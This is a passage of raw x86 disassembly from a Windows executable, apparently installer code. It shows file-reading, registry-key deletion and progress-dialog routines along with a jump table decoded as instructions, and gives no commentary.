  402506:	6a 02                	push   $0x2
  402508:	89 5d d4             	mov    %ebx,-0x2c(%ebp)
  40250b:	e8 c9 04 00 00       	call   0x4029d9
  402510:	83 f8 01             	cmp    $0x1,%eax
  402513:	89 45 cc             	mov    %eax,-0x34(%ebp)
  402516:	0f 8c 6f 03 00 00    	jl     0x40288b
  40251c:	b9 ff 03 00 00       	mov    $0x3ff,%ecx
  402521:	3b c1                	cmp    %ecx,%eax
  402523:	7e 03                	jle    0x402528
  402525:	89 4d cc             	mov    %ecx,-0x34(%ebp)
  402528:	38 1e                	cmp    %bl,(%esi)
  40252a:	0f 84 8e 00 00 00    	je     0x4025be
  402530:	56                   	push   %esi
  402531:	88 5d 0b             	mov    %bl,0xb(%ebp)
  402534:	e8 1b 34 00 00       	call   0x405954
  402539:	39 5d cc             	cmp    %ebx,-0x34(%ebp)
  40253c:	89 45 f8             	mov    %eax,-0x8(%ebp)
  40253f:	7e 7d                	jle    0x4025be
  402541:	8b 75 d4             	mov    -0x2c(%ebp),%esi
  402544:	8d 45 d0             	lea    -0x30(%ebp),%eax
  402547:	53                   	push   %ebx
  402548:	50                   	push   %eax
  402549:	8d 45 f7             	lea    -0x9(%ebp),%eax
  40254c:	6a 01                	push   $0x1
  40254e:	50                   	push   %eax
  40254f:	ff 75 f8             	push   -0x8(%ebp)
  402552:	ff 15 2c 71 40 00    	call   *0x40712c
  402558:	85 c0                	test   %eax,%eax
  40255a:	74 65                	je     0x4025c1
  40255c:	83 7d d0 01          	cmpl   $0x1,-0x30(%ebp)
  402560:	75 5f                	jne    0x4025c1
  402562:	39 5d e8             	cmp    %ebx,-0x18(%ebp)
  402565:	75 21                	jne    0x402588
  402567:	80 7d 0b 0d          	cmpb   $0xd,0xb(%ebp)
  40256b:	74 2b                	je     0x402598
  40256d:	80 7d 0b 0a          	cmpb   $0xa,0xb(%ebp)
  402571:	74 25                	je     0x402598
  402573:	8a 45 f7             	mov    -0x9(%ebp),%al
  402576:	88 04 3e             	mov    %al,(%esi,%edi,1)
  402579:	46                   	inc    %esi
  40257a:	3a c3                	cmp    %bl,%al
  40257c:	88 45 0b             	mov    %al,0xb(%ebp)
  40257f:	74 40                	je     0x4025c1
  402581:	3b 75 cc             	cmp    -0x34(%ebp),%esi
  402584:	7c be                	jl     0x402544
  402586:	eb 39                	jmp    0x4025c1
  402588:	0f b6 45 f7          	movzbl -0x9(%ebp),%eax
  40258c:	50                   	push   %eax
  40258d:	57                   	push   %edi
  40258e:	e8 a8 33 00 00       	call   0x40593b
  402593:	e9 fc 02 00 00       	jmp    0x402894
  402598:	8a 45 f7             	mov    -0x9(%ebp),%al
  40259b:	38 45 0b             	cmp    %al,0xb(%ebp)
  40259e:	74 0e                	je     0x4025ae
  4025a0:	3c 0d                	cmp    $0xd,%al
  4025a2:	74 04                	je     0x4025a8
  4025a4:	3c 0a                	cmp    $0xa,%al
  4025a6:	75 06                	jne    0x4025ae
  4025a8:	88 04 3e             	mov    %al,(%esi,%edi,1)
  4025ab:	46                   	inc    %esi
  4025ac:	eb 13                	jmp    0x4025c1
  4025ae:	6a 01                	push   $0x1
  4025b0:	53                   	push   %ebx
  4025b1:	6a ff                	push   $0xffffffff
  4025b3:	ff 75 f8             	push   -0x8(%ebp)
  4025b6:	ff 15 34 71 40 00    	call   *0x407134
  4025bc:	eb 03                	jmp    0x4025c1
  4025be:	8b 75 d4             	mov    -0x2c(%ebp),%esi
  4025c1:	88 1c 3e             	mov    %bl,(%esi,%edi,1)
  4025c4:	3b f3                	cmp    %ebx,%esi
  4025c6:	e9 dd ef ff ff       	jmp    0x4015a8
  4025cb:	38 1e                	cmp    %bl,(%esi)
  4025cd:	0f 84 b8 02 00 00    	je     0x40288b
  4025d3:	ff 75 e8             	push   -0x18(%ebp)
  4025d6:	53                   	push   %ebx
  4025d7:	6a 02                	push   $0x2
  4025d9:	e8 fb 03 00 00       	call   0x4029d9
  4025de:	50                   	push   %eax
  4025df:	56                   	push   %esi
  4025e0:	e8 6f 33 00 00       	call   0x405954
  4025e5:	50                   	push   %eax
  4025e6:	ff 15 34 71 40 00    	call   *0x407134
  4025ec:	39 5d e0             	cmp    %ebx,-0x20(%ebp)
  4025ef:	0f 8c 96 02 00 00    	jl     0x40288b
  4025f5:	e9 37 02 00 00       	jmp    0x402831
  4025fa:	38 1e                	cmp    %bl,(%esi)
  4025fc:	0f 84 89 02 00 00    	je     0x40288b
  402602:	56                   	push   %esi
  402603:	e8 4c 33 00 00       	call   0x405954
  402608:	50                   	push   %eax
  402609:	ff 15 38 71 40 00    	call   *0x407138
  40260f:	e9 77 02 00 00       	jmp    0x40288b
  402614:	38 1f                	cmp    %bl,(%edi)
  402616:	74 18                	je     0x402630
  402618:	8d 85 5c fe ff ff    	lea    -0x1a4(%ebp),%eax
  40261e:	50                   	push   %eax
  40261f:	57                   	push   %edi
  402620:	e8 2f 33 00 00       	call   0x405954
  402625:	50                   	push   %eax
  402626:	ff 15 3c 71 40 00    	call   *0x40713c
  40262c:	85 c0                	test   %eax,%eax
  40262e:	75 3f                	jne    0x40266f
  402630:	c7 45 fc 01 00 00 00 	movl   $0x1,-0x4(%ebp)
  402637:	88 1e                	mov    %bl,(%esi)
  402639:	e9 4d 02 00 00       	jmp    0x40288b
  40263e:	6a 02                	push   $0x2
  402640:	e8 b1 03 00 00       	call   0x4029f6
  402645:	8d 8d 5c fe ff ff    	lea    -0x1a4(%ebp),%ecx
  40264b:	51                   	push   %ecx
  40264c:	50                   	push   %eax
  40264d:	ff 15 40 71 40 00    	call   *0x407140
  402653:	83 f8 ff             	cmp    $0xffffffff,%eax
  402656:	75 10                	jne    0x402668
  402658:	88 1f                	mov    %bl,(%edi)
  40265a:	88 1e                	mov    %bl,(%esi)
  40265c:	c7 45 fc 01 00 00 00 	movl   $0x1,-0x4(%ebp)
  402663:	e9 23 02 00 00       	jmp    0x40288b
  402668:	50                   	push   %eax
  402669:	57                   	push   %edi
  40266a:	e8 cc 32 00 00       	call   0x40593b
  40266f:	8d 85 88 fe ff ff    	lea    -0x178(%ebp),%eax
  402675:	50                   	push   %eax
  402676:	56                   	push   %esi
  402677:	e9 35 01 00 00       	jmp    0x4027b1
  40267c:	6a f0                	push   $0xfffffff0
  40267e:	c7 45 f8 66 fd ff ff 	movl   $0xfffffd66,-0x8(%ebp)
  402685:	e8 6c 03 00 00       	call   0x4029f6
  40268a:	8b f0                	mov    %eax,%esi
  40268c:	56                   	push   %esi
  40268d:	89 75 bc             	mov    %esi,-0x44(%ebp)
  402690:	e8 a8 2e 00 00       	call   0x40553d
  402695:	85 c0                	test   %eax,%eax
  402697:	75 07                	jne    0x4026a0
  402699:	6a ed                	push   $0xffffffed
  40269b:	e8 56 03 00 00       	call   0x4029f6
  4026a0:	56                   	push   %esi
  4026a1:	e8 ef 2f 00 00       	call   0x405695
  4026a6:	6a 02                	push   $0x2
  4026a8:	68 00 00 00 40       	push   $0x40000000
  4026ad:	56                   	push   %esi
  4026ae:	e8 01 30 00 00       	call   0x4056b4
  4026b3:	83 f8 ff             	cmp    $0xffffffff,%eax
  4026b6:	89 45 08             	mov    %eax,0x8(%ebp)
  4026b9:	0f 84 9d 00 00 00    	je     0x40275c
  4026bf:	a1 94 3e 42 00       	mov    0x423e94,%eax
  4026c4:	8b 35 00 71 40 00    	mov    0x407100,%esi
  4026ca:	50                   	push   %eax
  4026cb:	6a 40                	push   $0x40
  4026cd:	89 45 d4             	mov    %eax,-0x2c(%ebp)
  4026d0:	ff d6                	call   *%esi
  4026d2:	8b f8                	mov    %eax,%edi
  4026d4:	3b fb                	cmp    %ebx,%edi
  4026d6:	74 7b                	je     0x402753
  4026d8:	53                   	push   %ebx
  4026d9:	e8 a2 09 00 00       	call   0x403080
  4026de:	ff 75 d4             	push   -0x2c(%ebp)
  4026e1:	57                   	push   %edi
  4026e2:	e8 67 09 00 00       	call   0x40304e
  4026e7:	ff 75 e4             	push   -0x1c(%ebp)
  4026ea:	6a 40                	push   $0x40
  4026ec:	ff d6                	call   *%esi
  4026ee:	8b f0                	mov    %eax,%esi
  4026f0:	3b f3                	cmp    %ebx,%esi
  4026f2:	89 75 d0             	mov    %esi,-0x30(%ebp)
  4026f5:	74 34                	je     0x40272b
  4026f7:	ff 75 e4             	push   -0x1c(%ebp)
  4026fa:	56                   	push   %esi
  4026fb:	53                   	push   %ebx
  4026fc:	ff 75 e0             	push   -0x20(%ebp)
  4026ff:	e8 57 07 00 00       	call   0x402e5b
  402704:	eb 18                	jmp    0x40271e
  402706:	8b 0e                	mov    (%esi),%ecx
  402708:	8b 46 04             	mov    0x4(%esi),%eax
  40270b:	83 c6 08             	add    $0x8,%esi
  40270e:	51                   	push   %ecx
  40270f:	03 c7                	add    %edi,%eax
  402711:	56                   	push   %esi
  402712:	50                   	push   %eax
  402713:	89 4d c8             	mov    %ecx,-0x38(%ebp)
  402716:	e8 5a 2f 00 00       	call   0x405675
  40271b:	03 75 c8             	add    -0x38(%ebp),%esi
  40271e:	38 1e                	cmp    %bl,(%esi)
  402720:	75 e4                	jne    0x402706
  402722:	ff 75 d0             	push   -0x30(%ebp)
  402725:	ff 15 fc 70 40 00    	call   *0x4070fc
  40272b:	8d 45 f8             	lea    -0x8(%ebp),%eax
  40272e:	53                   	push   %ebx
  40272f:	50                   	push   %eax
  402730:	ff 75 d4             	push   -0x2c(%ebp)
  402733:	57                   	push   %edi
  402734:	ff 75 08             	push   0x8(%ebp)
  402737:	ff 15 28 71 40 00    	call   *0x407128
  40273d:	57                   	push   %edi
  40273e:	ff 15 fc 70 40 00    	call   *0x4070fc
  402744:	53                   	push   %ebx
  402745:	53                   	push   %ebx
  402746:	ff 75 08             	push   0x8(%ebp)
  402749:	6a ff                	push   $0xffffffff
  40274b:	e8 0b 07 00 00       	call   0x402e5b
  402750:	89 45 f8             	mov    %eax,-0x8(%ebp)
  402753:	ff 75 08             	push   0x8(%ebp)
  402756:	ff 15 ec 70 40 00    	call   *0x4070ec
  40275c:	39 5d f8             	cmp    %ebx,-0x8(%ebp)
  40275f:	6a f3                	push   $0xfffffff3
  402761:	5e                   	pop    %esi
  402762:	7d 13                	jge    0x402777
  402764:	6a ef                	push   $0xffffffef
  402766:	5e                   	pop    %esi
  402767:	ff 75 bc             	push   -0x44(%ebp)
  40276a:	ff 15 44 71 40 00    	call   *0x407144
  402770:	c7 45 fc 01 00 00 00 	movl   $0x1,-0x4(%ebp)
  402777:	56                   	push   %esi
  402778:	e9 e7 f9 ff ff       	jmp    0x402164
  40277d:	53                   	push   %ebx
  40277e:	e8 56 02 00 00       	call   0x4029d9
  402783:	3b 05 ac 3e 42 00    	cmp    0x423eac,%eax
  402789:	89 45 08             	mov    %eax,0x8(%ebp)
  40278c:	0f 83 ca fe ff ff    	jae    0x40265c
  402792:	8b f0                	mov    %eax,%esi
  402794:	8b 45 e4             	mov    -0x1c(%ebp),%eax
  402797:	69 f6 18 04 00 00    	imul   $0x418,%esi,%esi
  40279d:	03 35 a8 3e 42 00    	add    0x423ea8,%esi
  4027a3:	3b c3                	cmp    %ebx,%eax
  4027a5:	7c 17                	jl     0x4027be
  4027a7:	8b 0c 86             	mov    (%esi,%eax,4),%ecx
  4027aa:	75 0f                	jne    0x4027bb
  4027ac:	83 c6 18             	add    $0x18,%esi
  4027af:	56                   	push   %esi
  4027b0:	57                   	push   %edi
  4027b1:	e8 27 32 00 00       	call   0x4059dd
  4027b6:	e9 d0 00 00 00       	jmp    0x40288b
  4027bb:	51                   	push   %ecx
  4027bc:	eb 74                	jmp    0x402832
  4027be:	83 c9 ff             	or     $0xffffffff,%ecx
  4027c1:	2b c8                	sub    %eax,%ecx
  4027c3:	89 4d e4             	mov    %ecx,-0x1c(%ebp)
  4027c6:	74 0c                	je     0x4027d4
  4027c8:	6a 01                	push   $0x1
  4027ca:	e8 0a 02 00 00       	call   0x4029d9
  4027cf:	89 45 e0             	mov    %eax,-0x20(%ebp)
  4027d2:	eb 10                	jmp    0x4027e4
  4027d4:	ff 75 ec             	push   -0x14(%ebp)
  4027d7:	8d 46 18             	lea    0x18(%esi),%eax
  4027da:	50                   	push   %eax
  4027db:	e8 1f 32 00 00       	call   0x4059ff
  4027e0:	80 4e 09 01          	orb    $0x1,0x9(%esi)
  4027e4:	8b 45 e4             	mov    -0x1c(%ebp),%eax
  4027e7:	8b 4d e0             	mov    -0x20(%ebp),%ecx
  4027ea:	89 0c 86             	mov    %ecx,(%esi,%eax,4)
  4027ed:	39 5d e8             	cmp    %ebx,-0x18(%ebp)
  4027f0:	0f 84 95 00 00 00    	je     0x40288b
  4027f6:	ff 75 08             	push   0x8(%ebp)
  4027f9:	e8 7f e9 ff ff       	call   0x40117d
  4027fe:	e9 88 00 00 00       	jmp    0x40288b
  402803:	53                   	push   %ebx
  402804:	e8 d0 01 00 00       	call   0x4029d9
  402809:	83 f8 20             	cmp    $0x20,%eax
  40280c:	0f 83 4a fe ff ff    	jae    0x40265c
  402812:	39 5d e8             	cmp    %ebx,-0x18(%ebp)
  402815:	74 23                	je     0x40283a
  402817:	39 5d e4             	cmp    %ebx,-0x1c(%ebp)
  40281a:	74 0f                	je     0x40282b
  40281c:	50                   	push   %eax
  40281d:	e8 77 ea ff ff       	call   0x401299
  402822:	53                   	push   %ebx
  402823:	53                   	push   %ebx
  402824:	e8 c6 e9 ff ff       	call   0x4011ef
  402829:	eb 60                	jmp    0x40288b
  40282b:	53                   	push   %ebx
  40282c:	e8 b1 ea ff ff       	call   0x4012e2
  402831:	50                   	push   %eax
  402832:	57                   	push   %edi
  402833:	e8 03 31 00 00       	call   0x40593b
  402838:	eb 51                	jmp    0x40288b
  40283a:	39 5d e4             	cmp    %ebx,-0x1c(%ebp)
  40283d:	74 12                	je     0x402851
  40283f:	8b 15 90 3e 42 00    	mov    0x423e90,%edx
  402845:	8b 4d e0             	mov    -0x20(%ebp),%ecx
  402848:	89 8c 82 94 00 00 00 	mov    %ecx,0x94(%edx,%eax,4)
  40284f:	eb 3a                	jmp    0x40288b
  402851:	8b 0d 90 3e 42 00    	mov    0x423e90,%ecx
  402857:	ff b4 81 94 00 00 00 	push   0x94(%ecx,%eax,4)
  40285e:	57                   	push   %edi
  40285f:	e8 9b 31 00 00       	call   0x4059ff
  402864:	eb 25                	jmp    0x40288b
  402866:	8b 0d 78 14 42 00    	mov    0x421478,%ecx
  40286c:	53                   	push   %ebx
  40286d:	23 c8                	and    %eax,%ecx
  40286f:	51                   	push   %ecx
  402870:	6a 0b                	push   $0xb
  402872:	ff 75 cc             	push   -0x34(%ebp)
  402875:	ff 15 44 72 40 00    	call   *0x407244
  40287b:	39 5d dc             	cmp    %ebx,-0x24(%ebp)
  40287e:	74 0b                	je     0x40288b
  402880:	53                   	push   %ebx
  402881:	53                   	push   %ebx
  402882:	ff 75 cc             	push   -0x34(%ebp)
  402885:	ff 15 40 72 40 00    	call   *0x407240
  40288b:	8b 45 fc             	mov    -0x4(%ebp),%eax
  40288e:	01 05 08 3f 42 00    	add    %eax,0x423f08
  402894:	33 c0                	xor    %eax,%eax
  402896:	5f                   	pop    %edi
  402897:	5e                   	pop    %esi
  402898:	5b                   	pop    %ebx
  402899:	c9                   	leave
  40289a:	c2 04 00             	ret    $0x4
  40289d:	96                   	xchg   %eax,%esi
  40289e:	28 40 00             	sub    %al,0x0(%eax)
  4028a1:	90                   	nop
  4028a2:	14 40                	adc    $0x40,%al
  4028a4:	00 9c 14 40 00 b7 14 	add    %bl,0x14b70040(%esp,%edx,1)
  4028ab:	40                   	inc    %eax
  4028ac:	00 ca                	add    %cl,%dl
  4028ae:	14 40                	adc    $0x40,%al
  4028b0:	00 d6                	add    %dl,%dh
  4028b2:	14 40                	adc    $0x40,%al
  4028b4:	00 f0                	add    %dh,%al
  4028b6:	14 40                	adc    $0x40,%al
  4028b8:	00 67 15             	add    %ah,0x15(%edi)
  4028bb:	40                   	inc    %eax
  4028bc:	00 95 15 40 00 b3    	add    %dl,-0x4cffbfeb(%ebp)
  4028c2:	15 40 00 34 16       	adc    $0x16340040,%eax
  4028c7:	40                   	inc    %eax
  4028c8:	00 fe                	add    %bh,%dh
  4028ca:	14 40                	adc    $0x40,%al
  4028cc:	00 39                	add    %bh,(%ecx)
  4028ce:	15 40 00 5a 15       	adc    $0x155a0040,%eax
  4028d3:	40                   	inc    %eax
  4028d4:	00 45 16             	add    %al,0x16(%ebp)
  4028d7:	40                   	inc    %eax
  4028d8:	00 96 16 40 00 fa    	add    %dl,-0x5ffbfea(%esi)
  4028de:	16                   	push   %ss
  4028df:	40                   	inc    %eax
  4028e0:	00 21                	add    %ah,(%ecx)
  4028e2:	17                   	pop    %ss
  4028e3:	40                   	inc    %eax
  4028e4:	00 34 17             	add    %dh,(%edi,%edx,1)
  4028e7:	40                   	inc    %eax
  4028e8:	00 d8                	add    %bl,%al
  4028ea:	18 40 00             	sbb    %al,0x0(%eax)
  4028ed:	db 18                	fistpl (%eax)
  4028ef:	40                   	inc    %eax
  4028f0:	00 0d 19 40 00 22    	add    %cl,0x22004019
  4028f6:	19 40 00             	sbb    %eax,0x0(%eax)
  4028f9:	34 19                	xor    $0x19,%al
  4028fb:	40                   	inc    %eax
  4028fc:	00 b5 19 40 00 e6    	add    %dh,-0x19ffbfe7(%ebp)
  402902:	19 40 00             	sbb    %eax,0x0(%eax)
  402905:	26 1a 40 00          	sbb    %es:0x0(%eax),%al
  402909:	58                   	pop    %eax
  40290a:	1a 40 00             	sbb    0x0(%eax),%al
  40290d:	e5 1a                	in     $0x1a,%eax
  40290f:	40                   	inc    %eax
  402910:	00 06                	add    %al,(%esi)
  402912:	1b 40 00             	sbb    0x0(%eax),%eax
  402915:	ad                   	lods   %ds:(%esi),%eax
  402916:	1b 40 00             	sbb    0x0(%eax),%eax
  402919:	ad                   	lods   %ds:(%esi),%eax
  40291a:	1b 40 00             	sbb    0x0(%eax),%eax
  40291d:	6d                   	insl   (%dx),%es:(%edi)
  40291e:	1c 40                	sbb    $0x40,%al
  402920:	00 8a 1c 40 00 a5    	add    %cl,-0x5affbfe4(%edx)
  402926:	1c 40                	sbb    $0x40,%al
  402928:	00 c1                	add    %al,%cl
  40292a:	1c 40                	sbb    $0x40,%al
  40292c:	00 1b                	add    %bl,(%ebx)
  40292e:	1d 40 00 95 1d       	sbb    $0x1d950040,%eax
  402933:	40                   	inc    %eax
  402934:	00 c1                	add    %al,%cl
  402936:	1d 40 00 1b 1e       	sbb    $0x1e1b0040,%eax
  40293b:	40                   	inc    %eax
  40293c:	00 95 1e 40 00 c5    	add    %dl,-0x3affbfe2(%ebp)
  402942:	1e                   	push   %ds
  402943:	40                   	inc    %eax
  402944:	00 50 1f             	add    %dl,0x1f(%eax)
  402947:	40                   	inc    %eax
  402948:	00 20                	add    %ah,(%eax)
  40294a:	20 40 00             	and    %al,0x0(%eax)
  40294d:	72 21                	jb     0x402970
  40294f:	40                   	inc    %eax
  402950:	00 f4                	add    %dh,%ah
  402952:	21 40 00             	and    %eax,0x0(%eax)
  402955:	23 22                	and    (%edx),%esp
  402957:	40                   	inc    %eax
  402958:	00 67 22             	add    %ah,0x22(%edi)
  40295b:	40                   	inc    %eax
  40295c:	00 a7 22 40 00 03    	add    %ah,0x3004022(%edi)
  402962:	23 40 00             	and    0x0(%eax),%eax
  402965:	af                   	scas   %es:(%edi),%eax
  402966:	23 40 00             	and    0x0(%eax),%eax
  402969:	27                   	daa
  40296a:	24 40                	and    $0x40,%al
  40296c:	00 88 24 40 00 9c    	add    %cl,-0x63ffbfdc(%eax)
  402972:	24 40                	and    $0x40,%al
  402974:	00 be 24 40 00 06    	add    %bh,0x6004024(%esi)
  40297a:	25 40 00 cb 25       	and    $0x25cb0040,%eax
  40297f:	40                   	inc    %eax
  402980:	00 fa                	add    %bh,%dl
  402982:	25 40 00 14 26       	and    $0x26140040,%eax
  402987:	40                   	inc    %eax
  402988:	00 3e                	add    %bh,(%esi)
  40298a:	26 40                	es inc %eax
  40298c:	00 7c 26 40          	add    %bh,0x40(%esi,%eiz,1)
  402990:	00 7d 27             	add    %bh,0x27(%ebp)
  402993:	40                   	inc    %eax
  402994:	00 03                	add    %al,(%ebx)
  402996:	28 40 00             	sub    %al,0x0(%eax)
  402999:	8b 28                	mov    (%eax),%ebp
  40299b:	40                   	inc    %eax
  40299c:	00 8b 28 40 00 66    	add    %cl,0x66004028(%ebx)
  4029a2:	28 40 00             	sub    %al,0x0(%eax)
  4029a5:	79 1a                	jns    0x4029c1
  4029a7:	40                   	inc    %eax
  4029a8:	00 7d 1a             	add    %bh,0x1a(%ebp)
  4029ab:	40                   	inc    %eax
  4029ac:	00 81 1a 40 00 88    	add    %al,-0x77ffbfe6(%ecx)
  4029b2:	1a 40 00             	sbb    0x0(%eax),%al
  4029b5:	95                   	xchg   %eax,%ebp
  4029b6:	1a 40 00             	sbb    0x0(%eax),%al
  4029b9:	99                   	cltd
  4029ba:	1a 40 00             	sbb    0x0(%eax),%al
  4029bd:	9d                   	popf
  4029be:	1a 40 00             	sbb    0x0(%eax),%al
  4029c1:	a1 1a 40 00 aa       	mov    0xaa00401a,%eax
  4029c6:	1a 40 00             	sbb    0x0(%eax),%al
  4029c9:	b4 1a                	mov    $0x1a,%ah
  4029cb:	40                   	inc    %eax
  4029cc:	00 c1                	add    %al,%cl
  4029ce:	1a 40 00             	sbb    0x0(%eax),%al
  4029d1:	d9 1a                	fstps  (%edx)
  4029d3:	40                   	inc    %eax
  4029d4:	00 dd                	add    %bl,%ch
  4029d6:	1a 40 00             	sbb    0x0(%eax),%al
  4029d9:	8b 44 24 04          	mov    0x4(%esp),%eax
  4029dd:	8b 0d 48 9b 40 00    	mov    0x409b48,%ecx
  4029e3:	ff 34 81             	push   (%ecx,%eax,4)
  4029e6:	6a 00                	push   $0x0
  4029e8:	e8 12 30 00 00       	call   0x4059ff
  4029ed:	50                   	push   %eax
  4029ee:	e8 61 2f 00 00       	call   0x405954
  4029f3:	c2 04 00             	ret    $0x4
  4029f6:	56                   	push   %esi
  4029f7:	8b 74 24 08          	mov    0x8(%esp),%esi
  4029fb:	85 f6                	test   %esi,%esi
  4029fd:	57                   	push   %edi
  4029fe:	8b c6                	mov    %esi,%eax
  402a00:	7d 02                	jge    0x402a04
  402a02:	f7 d8                	neg    %eax
  402a04:	8b 15 48 9b 40 00    	mov    0x409b48,%edx
  402a0a:	8b c8                	mov    %eax,%ecx
  402a0c:	83 e1 0f             	and    $0xf,%ecx
  402a0f:	c1 f8 04             	sar    $0x4,%eax
  402a12:	ff 34 8a             	push   (%edx,%ecx,4)
  402a15:	c1 e0 0a             	shl    $0xa,%eax
  402a18:	05 50 9b 40 00       	add    $0x409b50,%eax
  402a1d:	50                   	push   %eax
  402a1e:	e8 dc 2f 00 00       	call   0x4059ff
  402a23:	85 f6                	test   %esi,%esi
  402a25:	8b f8                	mov    %eax,%edi
  402a27:	7d 06                	jge    0x402a2f
  402a29:	57                   	push   %edi
  402a2a:	e8 10 32 00 00       	call   0x405c3f
  402a2f:	8b c7                	mov    %edi,%eax
  402a31:	5f                   	pop    %edi
  402a32:	5e                   	pop    %esi
  402a33:	c2 04 00             	ret    $0x4
  402a36:	55                   	push   %ebp
  402a37:	8b ec                	mov    %esp,%ebp
  402a39:	81 ec 0c 01 00 00    	sub    $0x10c,%esp
  402a3f:	53                   	push   %ebx
  402a40:	56                   	push   %esi
  402a41:	8d 45 fc             	lea    -0x4(%ebp),%eax
  402a44:	57                   	push   %edi
  402a45:	50                   	push   %eax
  402a46:	a1 30 3f 42 00       	mov    0x423f30,%eax
  402a4b:	0c 08                	or     $0x8,%al
  402a4d:	33 db                	xor    %ebx,%ebx
  402a4f:	50                   	push   %eax
  402a50:	53                   	push   %ebx
  402a51:	ff 75 0c             	push   0xc(%ebp)
  402a54:	ff 75 08             	push   0x8(%ebp)
  402a57:	ff 15 10 70 40 00    	call   *0x407010
  402a5d:	3b c3                	cmp    %ebx,%eax
  402a5f:	75 69                	jne    0x402aca
  402a61:	8b 35 08 70 40 00    	mov    0x407008,%esi
  402a67:	bf 05 01 00 00       	mov    $0x105,%edi
  402a6c:	eb 19                	jmp    0x402a87
  402a6e:	39 5d 10             	cmp    %ebx,0x10(%ebp)
  402a71:	75 4b                	jne    0x402abe
  402a73:	8d 85 f4 fe ff ff    	lea    -0x10c(%ebp),%eax
  402a79:	53                   	push   %ebx
  402a7a:	50                   	push   %eax
  402a7b:	ff 75 fc             	push   -0x4(%ebp)
  402a7e:	e8 b3 ff ff ff       	call   0x402a36
  402a83:	85 c0                	test   %eax,%eax
  402a85:	75 12                	jne    0x402a99
  402a87:	8d 85 f4 fe ff ff    	lea    -0x10c(%ebp),%eax
  402a8d:	57                   	push   %edi
  402a8e:	50                   	push   %eax
  402a8f:	53                   	push   %ebx
  402a90:	ff 75 fc             	push   -0x4(%ebp)
  402a93:	ff d6                	call   *%esi
  402a95:	85 c0                	test   %eax,%eax
  402a97:	74 d5                	je     0x402a6e
  402a99:	ff 75 fc             	push   -0x4(%ebp)
  402a9c:	ff 15 1c 70 40 00    	call   *0x40701c
  402aa2:	6a 02                	push   $0x2
  402aa4:	e8 56 32 00 00       	call   0x405cff
  402aa9:	3b c3                	cmp    %ebx,%eax
  402aab:	74 24                	je     0x402ad1
  402aad:	53                   	push   %ebx
  402aae:	ff 35 30 3f 42 00    	push   0x423f30
  402ab4:	ff 75 0c             	push   0xc(%ebp)
  402ab7:	ff 75 08             	push   0x8(%ebp)
  402aba:	ff d0                	call   *%eax
  402abc:	eb 0c                	jmp    0x402aca
  402abe:	ff 75 fc             	push   -0x4(%ebp)
  402ac1:	ff 15 1c 70 40 00    	call   *0x40701c
  402ac7:	33 c0                	xor    %eax,%eax
  402ac9:	40                   	inc    %eax
  402aca:	5f                   	pop    %edi
  402acb:	5e                   	pop    %esi
  402acc:	5b                   	pop    %ebx
  402acd:	c9                   	leave
  402ace:	c2 0c 00             	ret    $0xc
  402ad1:	39 1d 30 3f 42 00    	cmp    %ebx,0x423f30
  402ad7:	75 ee                	jne    0x402ac7
  402ad9:	ff 75 0c             	push   0xc(%ebp)
  402adc:	ff 75 08             	push   0x8(%ebp)
  402adf:	ff 15 14 70 40 00    	call   *0x407014
  402ae5:	85 c0                	test   %eax,%eax
  402ae7:	75 de                	jne    0x402ac7
  402ae9:	eb df                	jmp    0x402aca
  402aeb:	8b 44 24 04          	mov    0x4(%esp),%eax
  402aef:	85 c0                	test   %eax,%eax
  402af1:	75 0a                	jne    0x402afd
  402af3:	a1 04 3f 42 00       	mov    0x423f04,%eax
  402af8:	05 01 00 00 80       	add    $0x80000001,%eax
  402afd:	c2 04 00             	ret    $0x4
  402b00:	55                   	push   %ebp
  402b01:	8b ec                	mov    %esp,%ebp
  402b03:	8d 45 08             	lea    0x8(%ebp),%eax
  402b06:	50                   	push   %eax
  402b07:	a1 30 3f 42 00       	mov    0x423f30,%eax
  402b0c:	0b 45 08             	or     0x8(%ebp),%eax
  402b0f:	50                   	push   %eax
  402b10:	6a 00                	push   $0x0
  402b12:	6a 22                	push   $0x22
  402b14:	e8 dd fe ff ff       	call   0x4029f6
  402b19:	50                   	push   %eax
  402b1a:	a1 48 9b 40 00       	mov    0x409b48,%eax
  402b1f:	ff 70 04             	push   0x4(%eax)
  402b22:	e8 c4 ff ff ff       	call   0x402aeb
  402b27:	50                   	push   %eax
  402b28:	ff 15 10 70 40 00    	call   *0x407010
  402b2e:	f7 d8                	neg    %eax
  402b30:	1b c0                	sbb    %eax,%eax
  402b32:	f7 d0                	not    %eax
  402b34:	23 45 08             	and    0x8(%ebp),%eax
  402b37:	5d                   	pop    %ebp
  402b38:	c2 04 00             	ret    $0x4
  402b3b:	55                   	push   %ebp
  402b3c:	8b ec                	mov    %esp,%ebp
  402b3e:	83 ec 40             	sub    $0x40,%esp
  402b41:	81 7d 0c 10 01 00 00 	cmpl   $0x110,0xc(%ebp)
  402b48:	75 19                	jne    0x402b63
  402b4a:	6a 00                	push   $0x0
  402b4c:	68 fa 00 00 00       	push   $0xfa
  402b51:	6a 01                	push   $0x1
  402b53:	ff 75 08             	push   0x8(%ebp)
  402b56:	ff 15 f0 71 40 00    	call   *0x4071f0
  402b5c:	c7 45 0c 13 01 00 00 	movl   $0x113,0xc(%ebp)
  402b63:	81 7d 0c 13 01 00 00 	cmpl   $0x113,0xc(%ebp)
  402b6a:	75 4c                	jne    0x402bb8
  402b6c:	8b 0d 18 b0 40 00    	mov    0x40b018,%ecx
  402b72:	a1 28 f0 41 00       	mov    0x41f028,%eax
  402b77:	3b c8                	cmp    %eax,%ecx
  402b79:	7c 02                	jl     0x402b7d
  402b7b:	8b c8                	mov    %eax,%ecx
  402b7d:	50                   	push   %eax
  402b7e:	6a 64                	push   $0x64
  402b80:	51                   	push   %ecx
  402b81:	ff 15 30 71 40 00    	call   *0x407130
  402b87:	50                   	push   %eax
  402b88:	8d 45 c0             	lea    -0x40(%ebp),%eax
  402b8b:	68 18 90 40 00       	push   $0x409018
  402b90:	50                   	push   %eax
  402b91:	ff 15 00 72 40 00    	call   *0x407200
  402b97:	83 c4 0c             	add    $0xc,%esp
  402b9a:	8d 45 c0             	lea    -0x40(%ebp),%eax
  402b9d:	50                   	push   %eax
  402b9e:	ff 75 08             	push   0x8(%ebp)
  402ba1:	ff 15 f4 71 40 00    	call   *0x4071f4
  402ba7:	8d 45 c0             	lea    -0x40(%ebp),%eax
  402baa:	50                   	push   %eax
  402bab:	68 06 04 00 00       	push   $0x406
  402bb0:	ff 75 08             	push   0x8(%ebp)
  402bb3:	e8 c4 26 00 00       	call   0x40527c
  402bb8:	33 c0                	xor    %eax,%eax
  402bba:	c9                   	leave
